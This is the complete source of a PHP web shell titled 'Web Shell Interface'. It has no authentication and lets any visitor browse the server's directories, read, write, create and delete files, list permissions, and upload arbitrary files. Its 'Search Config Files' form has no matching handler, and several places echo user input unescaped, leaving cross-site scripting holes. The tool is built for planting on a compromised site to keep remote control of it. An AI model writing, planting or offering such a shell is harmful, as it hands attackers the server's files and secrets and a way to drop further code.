<?php
session_start();

if (!isset($_SESSION['current_directory'])) {
    $_SESSION['current_directory'] = getcwd();
}

function searchFiles($dir, $keyword)
{
    $results = [];
    try {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
        foreach ($iterator as $file) {
            if (!$file->isDir() && stripos($file->getFilename(), $keyword) !== false) {
                $results[] = $file->getPathname();
            }
        }
    } catch (Exception $e) {
        echo "<div><h2>Access Denied: " . htmlspecialchars($dir) . "</h2></div>";
    }
    return $results;
}

function getFilePermissions($file)
{
    if (!file_exists($file))
        return "Error: File not found";

    $perms = fileperms($file);
    $info = match ($perms & 0xF000) {
        0xC000 => 's',
        0xA000 => 'l',
        0x8000 => '-',
        0x6000 => 'b',
        0x4000 => 'd',
        0x2000 => 'c',
        0x1000 => 'p',
        default => 'u'
    };
    $info .= (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : '-');
    return $info;
}

function listFilesWithPermissions($dir)
{
    try {
        $iterator = new DirectoryIterator($dir);
        echo "<h2>Directory Files: " . htmlspecialchars($dir) . "</h2><table border='1' cellpadding='5'><tr><th>Filename</th><th>Permissions</th></tr>";
        foreach ($iterator as $file) {
            if (!$file->isDot()) {
                echo "<tr><td>" . htmlspecialchars($file->getFilename()) . "</td><td>" . htmlspecialchars(getFilePermissions($file->getPathname())) . "</td></tr>";
            }
        }
        echo "</table>";
    } catch (Exception $e) {
        echo "<h2>Access Denied: " . htmlspecialchars($dir) . "</h2>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Web Shell</title>
    <style>
        body {
            background-color: #333;
            color: #bbb;
            font-family: monospace;
        }

        .container {
            padding: 20px;
            margin-top: 20px;
            background-color: #282828;
            border-radius: 8px;
            color: #eee;
        }

        .header {
            background-color: #444;
            padding: 10px;
            color: #fff;
            font-size: 1.2em;
        }

        .section {
            margin-top: 20px;
            padding: 20px;
            background-color: #333;
            border-radius: 8px;
        }

        .section h2 {
            color: #ff5;
        }

        button {
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
            background-color: #444;
            color: #eee;
            border: none;
            border-radius: 4px;
        }

        input[type="text"],
        input[type="number"],
        select,
        textarea,
        input[type="file"] {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            margin-bottom: 10px;
            border-radius: 4px;
            background: #555;
            color: #fff;
            border: 1px solid #777;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>Web Shell Interface</h1>
        </div>

        <div class="section">
            <h2>Command Input</h2>
            <p>Current Directory: <?php echo htmlspecialchars($_SESSION['current_directory']); ?></p>
            <form action="" method="POST" enctype="multipart/form-data">
                <input type="text" name="command"
                    placeholder="Enter command (e.g., help, cd <directory>, download <filename>, upload)">
                <input type="file" name="file_upload" id="file-upload">
                <button type="submit" name="execute_command">Execute Command</button>
            </form>
        </div>

        <div class="section">
            <h2>Search Config Files</h2>
            <form action="shell.php" method="GET">
                <input type="number" name="slvl" placeholder="Set Search Level" required>
                <button type="submit" name="search_config">Search Config Files</button>
            </form>
        </div>

        <div class="section">
            <h2>File Search</h2>
            <form action="" method="POST">
                <input type="text" name="search_keyword" placeholder="Enter keyword">
                <button type="submit" name="file_search">Search Files</button>
                <button type="submit" name="navigate_up">Go Up</button>
            </form>
            <?php
            if (isset($_POST['file_search']) && !empty($_POST['search_keyword'])) {
                $searchKeyword = $_POST['search_keyword'];
                $results = searchFiles($_SESSION['current_directory'], $searchKeyword);

                if (!empty($results)) {
                    echo "<h3>Search Results:</h3><ul>";
                    foreach ($results as $result) {
                        echo "<li>" . htmlspecialchars($result) . "</li>";
                    }
                    echo "</ul>";
                } else {
                    echo "<p>No results found for: " . htmlspecialchars($searchKeyword) . "</p>";
                }
            }
            ?>
        </div>

        <div class="section">
            <h2>File Manager</h2>
            <form action="shell.php" method="POST">
                <label>Create a New File:</label>
                <input type="text" name="filename" placeholder="Enter filename" required>
                <button type="submit" name="create_file">Create File</button>
            </form>
            <form action="shell.php" method="POST">
                <label>Select a File to Write:</label>
                <select name="writefile">
                    <?php
                    $files = array_diff(scandir($_SESSION['current_directory']), ['.', '..']);
                    foreach ($files as $file)
                        echo "<option value=\"$file\">$file</option>";
                    ?>
                </select>
                <label>Content:</label>
                <textarea name="content" placeholder="Enter content"></textarea>
                <button type="submit" name="write_file">Write to File</button>
            </form>
            <form action="shell.php" method="POST">
                <label>Select a File to Delete:</label>
                <select name="deletefile">
                    <?php foreach ($files as $file)
                        echo "<option value=\"$file\">$file</option>"; ?>
                </select>
                <button type="submit" name="delete_file">Delete File</button>
            </form>
            <form action="shell.php" method="POST">
                <label>Select a File to Read:</label>
                <select name="readfile">
                    <?php foreach ($files as $file)
                        echo "<option value=\"$file\">$file</option>"; ?>
                </select>
                <button type="submit" name="read_file">Read File</button>
            </form>
        </div>

        <div class="section">
            <h2>File Permissions</h2>
            <button onclick="location.reload()">Refresh Permissions</button>
            <?php listFilesWithPermissions($_SESSION['current_directory']); ?>
        </div>

        <div class="section">
            <h2>Reset Session</h2>
            <form action="shell.php" method="POST">
                <button type="submit" name="reset_session">Reset Session</button>
            </form>
        </div>
    </div>

    <?php

    if (isset($_POST['reset_session'])) {
        session_destroy();
        echo "<p>Session reset. Reload to continue.</p>";
    }

    if (isset($_POST['create_file'])) {
        $filename = $_POST['filename'];
        if (!file_exists($filename)) {
            $handle = fopen($filename, 'w');
            fclose($handle);
            echo "<p>File '$filename' created successfully.</p>";
        } else {
            echo "<p>File '$filename' already exists.</p>";
        }
    }

    if (isset($_POST['write_file'])) {
        $file = $_POST['writefile'];
        $content = $_POST['content'];
        if (file_put_contents($file, $content)) {
            echo "<p>Content written to '$file'.</p>";
        } else {
            echo "<p>Failed to write to '$file'.</p>";
        }
    }

    if (isset($_POST['delete_file'])) {
        $file = $_POST['deletefile'];
        if (unlink($file)) {
            echo "<p>File '$file' deleted successfully.</p>";
        } else {
            echo "<p>Failed to delete '$file'.</p>";
        }
    }

    if (isset($_POST['read_file'])) {
        $readFile = $_POST['readfile'];
        if (file_exists($readFile)) {
            echo "<h3>File Content:</h3><pre>" . htmlspecialchars(file_get_contents($readFile)) . "</pre>";
        } else {
            echo "<p>File does not exist.</p>";
        }
    }

    if (isset($_POST['execute_command'])) {
        $command = $_POST['command'];

        if (preg_match('/^help$/', $command)) {
            echo "<h3>Help Information:</h3>";
            echo "<ul>
            <li><strong>help</strong>: Shows this help information</li>
            <li><strong>cd &lt;directory&gt;</strong>: Changes the current directory to the specified one</li>
            <li><strong>download &lt;filename&gt;</strong>: Provides a download link for the specified file</li>
            <li><strong>upload</strong>: Uploads a selected file</li>
        </ul>";
        } elseif (preg_match('/^cd\s+(.+)$/', $command, $matches)) {
            $newDir = realpath($_SESSION['current_directory'] . DIRECTORY_SEPARATOR . $matches[1]);
            if ($newDir && is_dir($newDir)) {
                $_SESSION['current_directory'] = $newDir;
                echo "<p>Changed directory to: " . htmlspecialchars($newDir) . "</p>";
            } else {
                echo "<p>Invalid directory: " . htmlspecialchars($matches[1]) . "</p>";
            }
        } elseif (preg_match('/^download\s+(.+)$/', $command, $matches)) {
            $filename = $matches[1];
            $filepath = $_SESSION['current_directory'] . DIRECTORY_SEPARATOR . $filename;
            if (file_exists($filepath)) {
                $downloadLink = "download.php?file=" . urlencode($filepath);
                echo "<p><a href=\"$downloadLink\">Download $filename</a></p>";
            } else {
                echo "<p>File not found: $filename</p>";
            }
        } elseif (preg_match('/^upload$/', $command) && isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] == 0) {
            $uploadFile = $_SESSION['current_directory'] . DIRECTORY_SEPARATOR . basename($_FILES['file_upload']['name']);
            if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadFile)) {
                echo "<p>File uploaded successfully: " . htmlspecialchars($uploadFile) . "</p>";
            } else {
                echo "<p>File upload failed.</p>";
            }
        } else {
            echo "<p>Unknown command: $command</p>";
        }
    }
    ?>
</body>

</html>